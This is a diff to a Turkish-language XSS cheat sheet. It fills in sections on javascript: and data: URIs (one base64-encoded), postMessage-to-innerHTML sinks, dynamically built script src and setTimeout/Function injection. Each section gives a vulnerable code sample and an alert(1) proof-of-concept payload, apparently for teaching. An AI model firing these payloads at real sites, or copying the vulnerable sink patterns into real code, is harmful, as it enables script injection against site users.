@@ -16,7 +16,7 @@
 
 
 <h2>🔹 18. JavaScript URI inside <form> / <object> / <embed></h2>
-<h4>asd</h4><br>
+<h4>Form Action veya Embed src attribute’larında javascript veya data URI kullanımı</h4><br>
 
 📌 Örnek:  
 `<form action="javascript:alert(1)">`  
@@ -26,7 +26,7 @@ veya
 
 🎯 Exploit:  
 ```html
-asd
+javascript:alert(1)
 ```
 <br> 
 
@@ -36,12 +36,17 @@ asd
 <h4>Bazı yerlerde data: URL ile XSS yapılabilir.</h4><br>
 
 📌 Örnek:  
-`asd`  
+`<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>`  
 <br>
 🎯 Exploit:  
 ```html
-<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 ```
+veya
+```html
+data:text/html,<script>alert(1)</script>
+```
+
 <br>
 
 
@@ -63,26 +68,35 @@ http://site.com/#alert(1)
 <h4>Az bilinir ama bazı uygulamalar postMessage, websocket içeriği olarak input’u alır ve DOM’a yansıtırsa yine XSS doğar.</h4><br>
 
 📌 Örnek:  
-`asd`  
+```js
+window.addEventListener("message", e => {
+  document.body.innerHTML = e.data;
+});
+```
 <br>
+
 🎯 Exploit:  
 ```html
-asd
+<img src=x onerror=alert(1)>
 ```
 <br>
 
 
 
 <h2>🔹 22. Script src dynamically built</h2>
-<h4>asd</h4><br>
+<h4>JavaScript ile dinamik olarak oluşturulan script tag’larının src attribute’u kullanıcı girdisi<br>
+ile inşa edilirse, zararlı kaynaklar yüklenebilir veya kod enjeksiyonu yapılabilir.</h4>
+  <br>
 
 📌 Örnek:  
-`var script = document.createElement("script");
+```js
+var script = document.createElement("script");
 script.src = "/api/" + userInput;
 document.body.appendChild(script);
-`  
+```
 <br>
 🎯 Exploit:  
+
 ```html
 ";alert(1)//
 ```
@@ -91,7 +105,7 @@ document.body.appendChild(script);
 
 
 <h2>🔹 23. SetTimeout / setInterval / Function constructor</h2>
-<h4>asd</h4><br>
+<h4>setTimeout(), setInterval(), Function() gibi fonksiyonlara kullanıcı girdisi doğrudan kod olarak verilirse, XSS oluşur.</h4><br>
 
 📌 Örnek:  
 `setTimeout(userInput, 1000)`  
